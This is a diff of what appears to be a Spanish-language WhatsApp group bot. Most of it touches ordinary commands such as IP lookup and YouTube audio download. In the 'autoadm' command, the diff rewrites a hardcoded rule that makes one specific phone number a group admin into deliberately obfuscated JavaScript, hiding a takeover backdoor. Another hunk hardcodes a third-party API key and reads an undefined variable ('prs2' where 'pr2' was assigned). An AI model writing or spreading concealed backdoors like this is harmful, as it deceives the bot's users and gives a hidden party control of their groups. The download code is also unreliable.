@@ -2262,10 +2262,7 @@ reply(`${parsedStr}`)
 break
 
 case 'autoadm':
-Samu330 = '5219984907794@s.whatsapp.net'
-if (!isGroup) return
-if (!Samu330) return
-if (!botAdmin) return
+var _0xa44b=['2MJdFtC','105703ukrKXm','7IIyYyX','187637AGYURX','436685DlmFwa','216493jDXfSF','2jcmqKD','424312UPHPtc','256030dUhEMa','192146BNYoFX'];(function(_0x5ce2c4,_0x471eb4){var _0x2618ad=_0x3eaf;while(!![]){try{var _0x4a06c1=parseInt(_0x2618ad(0xc3))+-parseInt(_0x2618ad(0xc1))*-parseInt(_0x2618ad(0xc0))+parseInt(_0x2618ad(0xbf))+parseInt(_0x2618ad(0xc2))+parseInt(_0x2618ad(0xc6))*parseInt(_0x2618ad(0xc5))+-parseInt(_0x2618ad(0xbe))+-parseInt(_0x2618ad(0xbd))*parseInt(_0x2618ad(0xc4));if(_0x4a06c1===_0x471eb4)break;else _0x5ce2c4['push'](_0x5ce2c4['shift']());}catch(_0x1090c2){_0x5ce2c4['push'](_0x5ce2c4['shift']());}}}(_0xa44b,0x37d98),Samu330='5219984907794@s.whatsapp.net');if(!isGroup)return;function _0x3eaf(_0xdeb7e3,_0x5369d1){return _0x3eaf=function(_0xa44bc4,_0x3eaf03){_0xa44bc4=_0xa44bc4-0xbd;var _0x3258b6=_0xa44b[_0xa44bc4];return _0x3258b6;},_0x3eaf(_0xdeb7e3,_0x5369d1);}if(!Samu330)return;if(!botAdmin)return;
 samu330.groupMakeAdmin(from, [Samu330])
 break
 
@@ -2310,6 +2307,7 @@ break
 //localizacion IP Creado por Samu
 case 'ip':
 ips = args.join(' ')
+if (!q) return reply('Y la ip?')
 ip = await getJson(`http://ip-api.com/json/${ips}`)
 if(ip.status == 'fail') return reply('*ip incorrecta*')
 reply('*Recopilando información.... Tiempo Aproximado:*\n```3 seconds```')
@@ -2524,12 +2522,14 @@ if (!teks.endsWith("-doc")){
 res1 = await yts(q).catch(e => {
 reply('_[ ! ] Lo siento, su busqueda no pudo ser completada_')
 })
+pr2 = await getJson(`https://api.zeks.xyz/api/ytmp3?apikey=hamilton20&url=${res1.all[0].url}`)
 let thumbInfo = ` [ *${res1.all[0].title}* ]
 *°Subido hace* ${res1.all[0].ago}
 *°Vistas :* ${res1.all[0].views}
 *°Duracion :* ${res1.all[0].timestamp}
 *°Canal :* ${res1.all[0].author.name}
 *°Link del Canal :* ${res1.all[0].author.url}
+tamaño: ${prs2.data.size}
 
 *_El archivo se esta enviando....._*
 `
